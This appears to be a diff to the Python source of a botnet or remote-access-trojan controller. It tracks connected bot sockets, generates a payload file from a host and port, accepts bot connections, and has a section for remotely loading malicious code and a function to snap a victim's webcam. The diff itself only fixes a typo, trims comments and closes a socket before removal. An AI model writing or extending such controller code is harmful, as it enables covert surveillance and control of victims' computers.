@@ -81,8 +81,6 @@ def recv_json(socket:socket.socket) -> dict:
         raise NetError
 
 
-# Basic Function
-
 bot_list:list[socket.socket] = []
 
 def generate(host:str,port:str,path:str) -> None:
@@ -92,7 +90,7 @@ def generate(host:str,port:str,path:str) -> None:
     file.write(content)
     file.close()
     
-def serice(socket:socket.socket) -> None:
+def service(socket:socket.socket) -> None:
     try:
         socket.listen()
         while True:
@@ -101,7 +99,6 @@ def serice(socket:socket.socket) -> None:
             bot_list.append(bot_socket)
     except ConnectionResetError:
         pass
-    
     
 # Remotely load malicious code
 
@@ -185,6 +182,7 @@ def webcamsnap(socket:socket.socket,id:int,local_path:str) -> bool:
     return response["status"]
     
 def kill(id:int) -> None:
+    bot_list[id].close()
     bot_list.pop(id)
 
         
